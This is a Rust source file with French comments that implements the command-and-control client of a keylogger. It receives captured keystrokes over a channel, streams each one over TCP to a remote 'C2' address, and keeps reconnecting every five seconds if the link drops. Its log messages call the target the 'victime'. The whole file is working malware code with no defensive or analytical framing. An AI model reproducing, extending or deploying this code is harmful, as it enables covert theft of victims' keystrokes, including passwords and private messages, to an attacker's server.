use std::io::Write;
use std::net::TcpStream;
use std::sync::mpsc::Receiver;
use std::thread;
use std::time::Duration;

/// Connecte au C2 et envoie chaque frappe reçue via channel
pub fn start_c2_client(rx: Receiver<String>, ip: &str, port: u16) {
    let addr = format!("{}:{}", ip, port);

    loop {
        match TcpStream::connect(&addr) {
            Ok(mut stream) => {
                println!("[+] Connecté au C2 à {}", addr);

                loop {
                    // 🔑 1) Attendre une frappe
                    let keystroke = match rx.recv() {
                        Ok(k) => k,
                        Err(_) => {
                            println!("[-] Canal frappes fermé.");
                            return;
                        }
                    };

                    // 🔑 2) Envoyer avec \n et flush immédiat
                    if let Err(e) = stream.write_all(format!("{}\n", keystroke).as_bytes()) {
                        eprintln!("[-] Erreur d'envoi au C2 : {:?}", e);
                        break; // => reconnecte
                    }

                    if let Err(e) = stream.flush() {
                        eprintln!("[-] Erreur flush : {:?}", e);
                        break;
                    }
                }

                println!("[-] Victime déconnectée du C2, tentative de reconnexion...");
            }

            Err(e) => {
                eprintln!("[-] Connexion C2 échouée : {:?}. Retente dans 5s...", e);
                thread::sleep(Duration::from_secs(5));
            }
        }
    }
}
